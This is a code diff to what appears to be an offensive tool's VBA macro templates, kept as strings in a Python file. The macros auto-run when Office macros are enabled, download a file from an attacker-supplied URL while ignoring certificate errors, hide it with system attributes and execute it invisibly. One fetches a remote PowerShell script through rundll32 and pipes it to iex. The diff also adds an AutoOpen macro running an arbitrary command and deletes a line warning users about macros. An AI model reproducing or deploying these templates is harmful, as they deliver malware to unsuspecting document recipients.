@@ -4,7 +4,7 @@
 HELLO = \
 """
 Private Sub Hello()
-    MsgBox "Hello from <<<TEMPLATE>>>" & vbCrLf & "Remember to always be careful when you enable MS Office macros." & vbCrLf & "Have a nice day!"
+    MsgBox "Hello from <<<TEMPLATE>>>" & vbCrLf & "Have a nice day!"
 End Sub
 
 ' Auto launch when VBA enabled
@@ -25,8 +25,8 @@ Private Sub DownloadAndExecute()
     Dim WinHttpReq As Object, oStream As Object
     Dim result As Integer
     
-    myURL = "<<<TEMPLATE>>>"
-    downloadPath = "<<<TEMPLATE>>>"
+    myURL = "<<<URL>>>"
+    downloadPath = "<<<DOWNLOAD_PATH>>>"
     
     Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
@@ -41,8 +41,7 @@ Private Sub DownloadAndExecute()
         oStream.Write WinHttpReq.ResponseBody
         oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
         oStream.Close
-        CreateObject("WScript.Shell").Run downloadPath, 0
-        'result = Shell(downloadPath, 0) ' vbHide = 0
+        WscriptExec downloadPath
     End If    
     
 End Sub
@@ -66,8 +65,8 @@ Private Sub DownloadAndExecute()
     Dim WinHttpReq As Object, oStream As Object
     Dim result As Integer
     
-    myURL = "<<<TEMPLATE>>>"
-    downloadPath = "<<<TEMPLATE>>>"
+    myURL = "<<<URL>>>"
+    downloadPath = "<<<DOWNLOAD_PATH>>>"
     
     If Dir(downloadPath, vbHidden + vbSystem) = "" Then
         Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -85,7 +84,7 @@ Private Sub DownloadAndExecute()
             oStream.SaveToFile downloadPath, 2  ' 1 = no overwrite, 2 = overwrite (will not work with file attrs)
             oStream.Close
             SetAttr downloadPath, vbReadOnly + vbHidden + vbSystem
-            CreateObject("WScript.Shell").Run downloadPath, 0
+            WscriptExec downloadPath
         End If
        
     End If
@@ -112,14 +111,9 @@ End Sub
 
 Public Function Debugging() As Variant
     DownloadDLL
-    Dim Str As String
-    Str = "C:\Windows\System32\rundll32.exe " & Environ("TEMP") & "\powershdll.dll,main . { Invoke-WebRequest -useb <<<TEMPLATE>>> } ^| iex;"
-    strComputer = "."
-    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
-    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
-    Set objConfig = objStartup.SpawnInstance_
-    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-    errReturn = objProcess.Create(Str, Null, objConfig, intProcessID)
+    Dim strCmd As String
+    strCmd = "C:\Windows\System32\rundll32.exe " & Environ("TEMP") & "\powershdll.dll,main . { Invoke-WebRequest -useb <<<POWERSHELL_SCRIPT_URL>>> } ^| iex;"
+    WscriptExec strCmd
 End Function
 
 
@@ -362,8 +356,16 @@ End Sub
 
 """
 
-
 CMD = \
+r"""
+
+Private Sub AutoOpen()
+    WscriptExec "<<<CMD>>>"
+End Sub
+
+"""
+
+REMOTE_CMD = \
 r"""
 
 Dim serverUrl As String
